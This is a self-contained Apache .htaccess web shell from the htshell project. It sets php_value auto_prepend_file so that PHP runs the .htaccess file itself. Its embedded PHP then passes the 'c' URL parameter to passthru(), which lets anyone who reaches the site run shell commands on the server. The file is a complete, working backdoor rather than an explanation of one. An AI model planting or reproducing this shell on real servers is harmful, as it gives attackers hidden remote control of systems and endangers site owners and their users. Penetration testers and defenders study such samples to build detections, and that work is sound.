# Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com via (@0x6D6172696F)
# This shell only uses the php_value directive to invoke backdoor
# However, this only takes effect if apache is executing a php script.

# Execute .htaccess php code, by auto prepending the .htaccess file
php_value auto_prepend_file .htaccess
php_value output_buffering 1

###### SHELL ###### <?php ob_clean(); if ($_GET['c'] != '') { passthru($_GET['c']." 2>&1"); ob_flush(); exit; } else { ob_flush(); } ?>
